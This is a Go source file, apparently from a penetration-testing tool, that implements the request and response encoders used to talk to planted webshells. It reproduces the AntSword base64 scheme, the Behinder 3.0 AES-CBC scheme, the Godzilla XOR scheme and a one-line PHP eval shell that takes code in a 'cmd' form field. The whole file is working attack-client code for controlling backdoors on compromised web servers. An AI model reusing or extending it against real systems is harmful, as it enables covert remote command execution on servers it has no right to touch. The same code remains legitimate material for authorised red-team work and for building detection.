// Package webshell 移植自 AI-PENTEST backend/app/webshell（encoders/payloads/
// generators/client 四模块的 Go 版）。与原 Python 实现线上协议逐字节兼容：
// raw=蚁剑 base64；aes=冰蝎 3.0（AES-128-CBC，key=iv=md5(password)[:16] ASCII）；
// xor=哥斯拉（XOR key=md5(password+"godzilla")[:16] 后 base64）；
// form-cmd=一句话（POST cmd=<明文 PHP 代码>，自动剥 <?php ?> 标签）。
package webshell

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
)

// Encoder 与服务端 shell 模板配对的编码器。
type Encoder interface {
	Name() string
	// ContentType 提交 body 的 Content-Type；空串表示不设置。
	ContentType() string
	Encrypt(plaintext []byte, password string) ([]byte, error)
	// Decrypt 响应端解密；原实现约定：解不了就原样返回（服务端响应通常明文）。
	Decrypt(ciphertext []byte, password string) []byte
}

// md5KeyHex 与服务端模板里的 key 派生保持一致：
// md5(password+salt) hex 前 16 个 ASCII 字符。
func md5KeyHex(password, salt string) []byte {
	sum := md5.Sum([]byte(password + salt))
	return []byte(hex.EncodeToString(sum[:])[:16])
}

// ---------- raw（蚁剑） ----------

type RawEncoder struct{}

func (RawEncoder) Name() string        { return "raw" }
func (RawEncoder) ContentType() string { return "" }

func (RawEncoder) Encrypt(plain []byte, _ string) ([]byte, error) {
	out := make([]byte, base64.StdEncoding.EncodedLen(len(plain)))
	base64.StdEncoding.Encode(out, plain)
	return out, nil
}

func (RawEncoder) Decrypt(ciphertext []byte, _ string) []byte {
	if dec, err := base64.StdEncoding.DecodeString(string(ciphertext)); err == nil {
		return dec
	}
	return ciphertext
}

// ---------- aes（冰蝎 3.0） ----------

type AesEncoder struct{}

func (AesEncoder) Name() string        { return "aes" }
func (AesEncoder) ContentType() string { return "" }

func (AesEncoder) Encrypt(plain []byte, password string) ([]byte, error) {
	key := md5KeyHex(password, "")
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	padded := pkcs7Pad(plain, aes.BlockSize)
	enc := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, key).CryptBlocks(enc, padded)
	out := make([]byte, base64.StdEncoding.EncodedLen(len(enc)))
	base64.StdEncoding.Encode(out, enc)
	return out, nil
}

func (AesEncoder) Decrypt(ciphertext []byte, password string) []byte {
	raw, err := base64.StdEncoding.DecodeString(string(ciphertext))
	if err != nil || len(raw) == 0 || len(raw)%16 != 0 {
		return ciphertext
	}
	key := md5KeyHex(password, "")
	block, err := aes.NewCipher(key)
	if err != nil {
		return ciphertext
	}
	dec := make([]byte, len(raw))
	cipher.NewCBCDecrypter(block, key).CryptBlocks(dec, raw)
	if out, err := pkcs7Unpad(dec, aes.BlockSize); err == nil {
		return out
	}
	return ciphertext
}

// ---------- xor（哥斯拉） ----------

type XorEncoder struct{}

const xorSalt = "godzilla"

func (XorEncoder) Name() string        { return "xor" }
func (XorEncoder) ContentType() string { return "" }

func xorBytes(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

func (XorEncoder) Encrypt(plain []byte, password string) ([]byte, error) {
	xored := xorBytes(plain, md5KeyHex(password, xorSalt))
	out := make([]byte, base64.StdEncoding.EncodedLen(len(xored)))
	base64.StdEncoding.Encode(out, xored)
	return out, nil
}

func (XorEncoder) Decrypt(ciphertext []byte, password string) []byte {
	raw, err := base64.StdEncoding.DecodeString(string(ciphertext))
	if err != nil {
		return ciphertext
	}
	return xorBytes(raw, md5KeyHex(password, xorSalt))
}

// ---------- form-cmd（一句话） ----------

type FormCmdEncoder struct{}

func (FormCmdEncoder) Name() string        { return "form-cmd" }
func (FormCmdEncoder) ContentType() string { return "application/x-www-form-urlencoded" }

// resolveField password 可编码字段名："field:foo" 表示用 foo 作字段名，否则默认 cmd。
func resolveField(password string) string {
	if strings.HasPrefix(password, "field:") {
		if f := strings.TrimPrefix(password, "field:"); f != "" {
			return f
		}
	}
	return "cmd"
}

// stripPHPTags 一句话 eval 不能吃 <?php ?> 标签，自动剥掉。
func stripPHPTags(code string) string {
	s := code
	switch {
	case strings.HasPrefix(s, "<?php"):
		s = s[len("<?php"):]
	case strings.HasPrefix(s, "<?="):
		s = s[len("<?="):]
	case strings.HasPrefix(s, "<?"):
		s = s[len("<?"):]
	}
	s = strings.TrimSuffix(s, "?>")
	return strings.TrimSpace(s)
}

func (FormCmdEncoder) Encrypt(plain []byte, password string) ([]byte, error) {
	field := resolveField(password)
	form := url.Values{}
	form.Set(field, stripPHPTags(string(plain)))
	return []byte(form.Encode()), nil
}

func (FormCmdEncoder) Decrypt(ciphertext []byte, _ string) []byte { return ciphertext }

// ---------- 注册表 ----------

func GetEncoder(name string) (Encoder, error) {
	switch name {
	case "raw", "":
		return RawEncoder{}, nil
	case "aes":
		return AesEncoder{}, nil
	case "xor":
		return XorEncoder{}, nil
	case "form-cmd":
		return FormCmdEncoder{}, nil
	}
	return nil, fmt.Errorf("未知编码器: %s（支持 raw/aes/xor/form-cmd）", name)
}

// ---------- PKCS7 ----------

func pkcs7Pad(data []byte, blockSize int) []byte {
	pad := blockSize - len(data)%blockSize
	return append(data, bytes.Repeat([]byte{byte(pad)}, pad)...)
}

func pkcs7Unpad(data []byte, blockSize int) ([]byte, error) {
	if len(data) == 0 || len(data)%blockSize != 0 {
		return nil, fmt.Errorf("invalid padding size")
	}
	pad := int(data[len(data)-1])
	if pad == 0 || pad > blockSize || pad > len(data) {
		return nil, fmt.Errorf("invalid padding")
	}
	for _, b := range data[len(data)-pad:] {
		if int(b) != pad {
			return nil, fmt.Errorf("invalid padding byte")
		}
	}
	return data[:len(data)-pad], nil
}
